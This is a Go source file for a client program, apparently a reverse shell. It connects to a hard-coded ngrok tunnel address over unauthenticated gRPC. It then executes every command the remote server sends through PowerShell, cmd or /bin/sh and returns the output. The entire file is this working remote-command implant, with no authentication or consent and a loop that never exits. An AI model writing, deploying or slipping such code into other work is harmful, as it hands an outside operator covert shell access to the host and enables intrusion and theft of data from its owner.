package main

import (
	"context"
	"log"
	"os/exec"
	"runtime"
	"strings"

	"github.com/cardfaux/windows-connect/grpcapi"
	"google.golang.org/grpc"
)

func getCommandForShell(shell string, command string) *exec.Cmd {
	switch strings.ToLower(shell) {
	case "powershell":
		return exec.Command("powershell", "-Command", command)
	case "cmd":
		return exec.Command("cmd", "/C", command)
	case "sh":
		return exec.Command("/bin/sh", "-c", command)
	default:
		if runtime.GOOS == "windows" {
			return exec.Command("cmd", "/C", command)
		}
		return exec.Command("/bin/sh", "-c", command)
	}
}

func main() {
	conn, err := grpc.Dial("0.tcp.ngrok.io:11048", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer conn.Close()

	client := grpcapi.NewEchoServiceClient(conn)
	stream, err := client.ExecuteCommand(context.Background())
	if err != nil {
		log.Fatalf("Failed to create stream: %v", err)
	}

	// Goroutine to receive commands from server
	go func() {
		for {
			msg, err := stream.Recv()
			if err != nil {
					log.Printf("Stream receive error: %v", err)
					return
			}
	
			switch m := msg.Message.(type) {
			case *grpcapi.CommandMessage_CommandRequest:
					cmdReq := m.CommandRequest
					shell := cmdReq.Shell
					command := cmdReq.Command
	
					log.Printf("Received command with shell [%s]: %s", shell, command)
					cmd := getCommandForShell(shell, command)
					output, err := cmd.CombinedOutput()
					if err != nil {
							log.Printf("Execution error: %v", err)
					}
	
					err = stream.Send(&grpcapi.CommandMessage{
							Message: &grpcapi.CommandMessage_CommandResponse{
									CommandResponse: &grpcapi.CommandResponse{
											Output: string(output),
									},
							},
					})
					if err != nil {
							log.Printf("Failed to send output: %v", err)
							return
					}
					log.Println("Output sent to server.")
	
			case *grpcapi.CommandMessage_CommandResponse:
					// If your client ever expects to receive output, handle here
					log.Printf("Received output: %s", m.CommandResponse.Output)
	
			default:
					log.Printf("Unknown message type received")
			}
	}
	}()

	// Block main forever
	select {}
}